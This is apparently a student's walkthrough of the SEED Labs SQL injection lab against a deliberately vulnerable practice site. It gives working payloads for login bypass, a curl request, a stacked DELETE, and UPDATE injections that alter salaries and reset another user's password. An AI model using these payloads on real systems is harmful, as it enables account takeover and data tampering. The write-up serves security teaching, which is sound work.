# SQL Injection Attack


### Task 1:

Log in MYSQL:


      mysql -u root -pseedubuntu
		
      mysql> use Users;
		
![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/1.PNG)

      mysql> show tables;
     
![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/2.PNG)



Use such a SQL query:

      select * from credential where Name='Alice';


![alt tag](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/6.PNG)




### Task 2:
##### Task 2.1
	
- USERNAME: "Admin' #"
	
- PASSWORD: "" (here is password is optional)


![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/7.PNG)

We will result in SQL Query


      SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password
		  
      FROM credential
		  
      WHERE name='Admin' #' && password=''


##### Task 2.2
1- Write Code on Terminator in Seed Lab:
    
	curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23';
	
2- Copy the HTML code.

3- Make a new file in location "file:///home/seed/Documents/temp.html"

4. Run this location on browser



![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/8.PNG)

![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/9.PNG)

##### Task 2.3:
inject statment to append a row to current database:

    	'1=1; DELETE from credential where name='Alice';
	
After running query, go to browser and input as:
	
  
  - USERNAME: "'1=1; DELETE from credential where name='Alice';"
	
  
  - PASSWORD: "" (blank field)




![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/13.PNG)


### Task 3
Run This  "http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" to browser

##### Task 3.1
1- Login as Username= "Alice'#" && Password = "", 
	
2- Then edit the link to browser
  	http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php
	  
3- Update Phone Number as ', Salary=1000000 and save.


##### Task 3.2

1- Login as Username= 'Boby' #' and then open edit profile
	
2- Update Nick Name: ',Salary=0 and remaining unchanges

![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/14.PNG)

![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/15.PNG)
	
Login as Alice
	
Assume login as Boby and keep Alice login too. Open Alice profile edit
	
  
      Update Nick Name: ', Salary=1 where name='Boby' #

![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/16.PNG)
![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/18.PNG)
![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/19.PNG)

##### Task 3.3:	
We're login as Boby but change password of Alice

![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/16.PNG)

Than enter http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php

Assume we want to change ```Boby``` password as ```Annie123```. First, we should get SHA1 value of our new password via Terminal using Command
```
  echo "Annie123"|sha1sum
 ```
![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/21.PNG)

Than Modify Nick Name as ', password='2672275fe0c456fb671e4f417fb2f9892c7573ba' where name='Boby' # and save.
![mysql query](https://github.com/Qurat-ul-ainn/seedlab-SQL-Injection-Attacks/blob/main/22.PNG)

Now login information of "Boby" 
- USERNAME : Boby
- PASSWORD : Annie123
